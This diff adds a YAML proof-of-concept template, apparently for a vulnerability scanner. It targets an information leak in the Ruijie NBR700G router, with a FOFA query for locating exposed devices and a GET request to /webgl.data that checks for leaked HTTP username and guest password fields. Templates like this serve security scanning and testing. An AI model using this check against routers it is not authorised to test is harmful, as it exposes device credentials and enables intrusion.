@@ -1,0 +1,15 @@
+id: poc-yaml-ruijie-nbr700g-webgl-data-info-leak
+info:
+  name: 锐捷网络NBR700G webgl.data 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 锐捷网络NBR700G
+  fofa: body="系统负荷过高，导致网络拥塞，建议降低系统负荷或重启路由器"
+requests:
+- method: GET
+  path: /webgl.data
+  expression: "status_code == 200 && \ncontains(body,\"\\\"http_username\\\"\") &&\n\
+    contains(body,\"\\\"http_guest_pwd\\\"\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
